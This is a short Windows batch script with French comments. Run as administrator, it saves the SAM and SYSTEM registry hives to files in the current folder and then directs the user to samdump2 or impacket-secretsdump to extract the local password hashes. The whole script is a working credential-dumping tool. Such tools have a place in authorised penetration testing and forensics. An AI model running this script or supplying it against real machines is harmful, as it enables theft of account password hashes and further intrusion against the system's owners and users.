@echo off
REM Script pour extraire la base SAM
REM DOIT être exécuté EN TANT QU'ADMINISTRATEUR

echo ========================================
echo EXTRACTION DE LA BASE SAM
echo ========================================
echo.

REM Vérifier les droits admin
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    echo ERREUR: Ce script necessite les droits administrateur !
    echo Faites un clic droit et "Executer en tant qu'administrateur"
    pause
    exit /b 1
)

echo [1/2] Export de SAM...
reg save HKLM\SAM "%CD%\sam.hiv"
if %errorLevel% EQU 0 (
    echo OK - SAM exporte vers: %CD%\sam.hiv
) else (
    echo ECHEC - Impossible d'exporter SAM
)

echo.
echo [2/2] Export de SYSTEM...
reg save HKLM\SYSTEM "%CD%\system.hiv"
if %errorLevel% EQU 0 (
    echo OK - SYSTEM exporte vers: %CD%\system.hiv
) else (
    echo ECHEC - Impossible d'exporter SYSTEM
)

echo.
echo ========================================
echo TERMINE
echo ========================================
echo.
echo Les fichiers ont ete exportes dans:
echo %CD%
echo.
dir sam.hiv system.hiv 2>nul
echo.
echo Pour extraire les hash de mots de passe, utilisez:
echo   - samdump2 system.hiv sam.hiv
echo   - ou impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
echo.
pause
